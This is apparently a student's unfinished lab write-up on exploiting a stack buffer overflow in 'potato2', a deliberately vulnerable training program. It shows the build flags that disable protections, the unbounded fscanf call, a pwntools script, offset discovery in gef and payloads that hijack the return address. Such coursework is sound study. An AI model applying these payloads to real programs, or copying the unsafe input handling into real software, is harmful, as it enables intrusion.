# Stack Corruption

Student: Philip Magnus

The steps in this writeup were performed on a Ubuntu 24.04 LTS (x64) system.

## Building potato

For the building process the following packages have been installed. `pipx` is technically not used for the build process but the installation of `pwntools` a Python library enabling us to execute the attacks.

```bash
$ sudo apt install libssl-dev gcc gcc-multilib pipx -y
```

To install the *GDB Enhanced Features* suite (GEF) the following `curl` command was used.

```bash
$ bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
```

Next the source files for potato2 were checked out with its git repository.

```bash
$ git clone https://github.com/edgecase1/potato2.git
```

Using the following `Makefile` two binaries have been build to run the attacks against in the subsequent steps.

```make
# needs to have openssl checked out as sibling folder of potato
# git clone https://github.com/openssl/openssl.git
# and requires installation of gcc multilib
# sudo apt install gcc-multilib for m32

WARN_OPTS=-Wno-deprecated-declarations -Wno-unused-result
SEC_OPTS=-fno-stack-protector -z execstack -no-pie
DEBUG_OPTS=-ggdb3 -O0
# turn on optimizations to get some ROP gadgets
DEBUG_OPTS_ROP=-ggdb3 -O2
INCLUDES=-Iopenssl/include -I/usr/include -I/usr/include/x86_64-linux-gnu -Isrc
DEFINES=-D_FORTIFY_SOURCE=0

CCOPTS = $(WARN_OPTS) $(SEC_OPTS) $(DEBUG_OPTS) $(INCLUDES) $(DEFINES)
# include glibc statically to get additional gadgets
CCOPTS4ROP = -static $(WARN_OPTS) $(SEC_OPTS) $(DEBUG_OPTS_ROP) $(INCLUDES) $(DEFINES)

CFILES = \
	src/main.c \
	src/runr.c \
	src/sock.c \
	src/userlist.c \
	src/func.c \
	src/login2.c

HFILES = \
	src/runr.h \
	src/sock.h \
	src/user.h \
	src/userlist.h 

.PHONY: clean all

all: potato potato_rop

# binary for usual attacks
potato: $(CFILES) $(HFILES)
	gcc $(CCOPTS) -o potato $(CFILES) -Lopenssl  -lssl -lcrypto 

# binary for ROP attack
potato_rop: $(CFILES) $(HFILES)
	gcc $(CCOPTS4ROP) -o potato_rop $(CFILES) -Lopenssl  -lssl -lcrypto 

clean:
	rm -f potato potato_rop
```

The `potato` and `potato_rop` files were built using the `make` command.

```bash
$ make

gcc -Wno-deprecated-declarations -Wno-unused-result -fno-stack-protector -z execstack -no-pie -ggdb3 -O0 -Iopenssl/include -I/usr/include -I/usr/include/x86_64-linux-gnu -Ipotato2/src -D_FORTIFY_SOURCE=0 -o potato src/main.c src/runr.c src/sock.c src/userlist.c src/func.c src/login2.c -Lopenssl  -lssl -lcrypto
gcc -static -Wno-deprecated-declarations -Wno-unused-result -fno-stack-protector -z execstack -no-pie -ggdb3 -O2 -Iopenssl/include -I/usr/include -I/usr/include/x86_64-linux-gnu -Ipotato2/src -D_FORTIFY_SOURCE=0 -o potato_rop src/main.c src/runr.c src/sock.c src/userlist.c src/func.c src/login2.c -Lopenssl  -lssl -lcrypto
```

The `potato` executables can now be used as follows.

```bash
$ ./potato

./potato console
./potato server
```

To enable our Python scripts to run attacks against the `potato` binaries as well as starting the debugger and many more QoL features `pwntools` was installed using `pipx`.

```bash 
$ pipx install pwntools
```

`pipx` automatically manages Python `venvs` and allows for an easy way to install `pip` packages globally.

## Scanning for vulnerabilities

**TODO**

Instead of looking through the code manually the code was scanned for a list of functions, vulnerable to buffer overflows, using [ripgrep](https://github.com/BurntSushi/ripgrep) `rg` for short. `rg` scans all files in a directory, including sub-directories, for a given string and outputs the file in which the string was found as well as the line containing the string and the corresponding line number.

```bash
$ rg -w -n \
  -e "gets" \
  -e "strcpy" \
  -e "strcat" \
  -e "sprintf" \
  -e "vsprintf" \
  -e "scanf" \
  -e "fscanf" \
  -e "sscanf" \
  -e "memcpy" \
  -e "memmove" \
  -e "strtok"
  
func.c
60:    scanf("%d", &id);
187:    fscanf(stdin, "%s", input_username); // TODO security

userlist.c
240:    token = strtok(line, ":");
246:                strcpy(parsed_user->name, token);
257:                    strcpy(parsed_user->home, token);
260:                    strcpy(parsed_user->shell, token);
266:       token = strtok(NULL, ":");

login2.c
43:    strcpy(user->name, username);
44:    sprintf(user->home, "/home/%s", username);
45:    strcpy(user->shell, "/usr/bin/rbash");

```

The `fscanf` function on line 187 in the *func.c* file looks like a prime candidate that can be used for a buffer overflow. The string read from `stdin` is not limited by any size and thus can be used to write over the given buffer size of `input_username`, which is 50 bytes, directly onto the stack. This can be used to write a maliciously chosen address to the stack to redirect the execution flow of the program.

```C
void change_name() {
    char input_username[USERNAME_LENGTH];
        
    fprintf(stdout, "What is the name > ");
    //fgets(input_username, sizeof(input_username), stdin);
    fscanf(stdin, "%s", input_username); // TODO security
    input_username[strcspn(input_username, "\n")] = 0x00; // terminator instead of a newline

    strncpy(session.logged_in_user->name, input_username, strlen(input_username)+1);
    fprintf(stdout, "Name changed.\n");
}
```

## Debugging

**TODO**

### Environment Setup

As mentioned before in the installation step, `pwntools` was installed via the `pipx` command.

To run attacks against the target binaries we use the `pwntools` libraries in a specifically crafted Python script. A script with the name *attack.py* was created and the following code was used for a setup.

```Python
#!/usr/bin/env python3

from pwn import *
import sys

elf = ELF("./potato")

p = elf.process(["console"], stdin=PTY, aslr=False) # stdin=PTY for "getpass" password input
gdb.attach(p, '''
<SET BREAKPOINTS HERE>
continue
''')

print(p.recvuntil(b"cmd> ")) # username
p.sendline(b"login")
p.sendline(b"peter")
p.sendline(b"12345")
print(p.recvuntil(b"cmd> ")) # username

p.sendline(b"changename")

payload= <PAYLOAD GOES HERE>


p.sendline(payload)

p.interactive()

```

The script starts a `gdb` process attached to `./potato` and sends the given inputs against the running process. 

We make use of a known `username:password` combination to login to the software and start the possibly vulnerable`changename()` function. After starting the `changename()` function the script sends a crafted payload to try and trigger a buffer overflow.

#### Running the first buffer overflow

Using the following payload we can try and trigger a buffer overflow and overwrite the stack and eventually use the overwrite tomour advantage.

```Python
[...]
gdb.attach(p, '''
break func.c:191
continue
''')
[...]
payload=b'\x41' * 100
[...]
```

The payload was set to a binary string containing 100 `\x41` bytes which is equivalent to 100 times the letter `A`. 
Also a breakpoint was set at line 191 in the *func.c* file which is right before we return from the `changename()` function.

After running into the set breakpoint at line 191 the execution of `./potato` stops and we can investigate some of the programs behaviour in response to the given payload.

```bash
gef➤  x/8bx $rsp
0x7fffffffd2c0: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
```
Interesting is the value stored in the `$rsp` register because it will be handed to the `$rip` register to use as a return address when executing the return from the `changename()` function. When we resume the execution of our program, either with `c` to simply continue or `ni` to step throught the execution one instruction at a time, the program will crash with a `SEGMENTATION FAULT` (`SIGSEV`) because `0x4141414141414141` is not a valid return address mapped in the virtual memory space of our program.

### Payload to change flow of program execution

To redirect the execution flow we need to write a valid return address to the `$rsp` before the return of the fucntion. To write the wanted value into we need to find the offset at which the `$rsp` register lies in the process memory. 

To find the offset we can make use of the `pattern` functionality provided by `gef`. First a pattern was created in gdb using the `patern create` command. The generated pattern was then used as the payload in the *attack.py* script.

```python
payload=b'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaa...[ommited for readability]...fcaaaaaaf'
```

After running the script with the pattern as the `pattern search` functionality of `gef` can be used to find the offset of `$rsp`.

```bash
gef➤  pattern search $rsp
[+] Searching for '6a61616161616161'/'616161616161616a' with period=8
[+] Found at offset 72 (little-endian search) likely
```

After finding the offset we need the address in memory of the function we want to redirect the execution flow to. The `whoami()` function was chosen for this step. To find the address of the function in gdb the `print` functionality was used, i.e. `print whoami`. This provided the address `0x4045ca`. To jump to this function our attack script was adjusted with the following payload.

```python
payload = b'\x41' * 72 + p64(0x4045ca)
```

In the program output we could observe that the execution flow was redirected to the `whoami()` function.

```bash
What is the name > Name changed.
user(name='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xcaE@' id=1094795585 gid=1094795585 home='AAAAAAAAAAAA\xcaE@' shell='/usr/bin/rbash')
```

After executing the `whoami()` function the program still crasges because with our offset of `\x41` bytes we also overwrite the address of the previous stackframe. To avoid a program crash we need to write the address of the of the previous stackframe to the `$rbp` register. For this we need to find the offset of the `$rbp` register analogus to the `$rsp` register.

The offset of the `$rbp` register was 64 bytes. We also needed to get a valid value to store in `$rbp` for this a programm run without an overflow, i.e. payload of 'xyz', was used and the value of the register printed in gdb. The register contained the value `0x7fffffffd410`. 

With this information the payload was adjusted accordingly.

```python
payload = b'\x41' * 64 + p64(0x7fffffffd410) + p64(0x4045ca)
```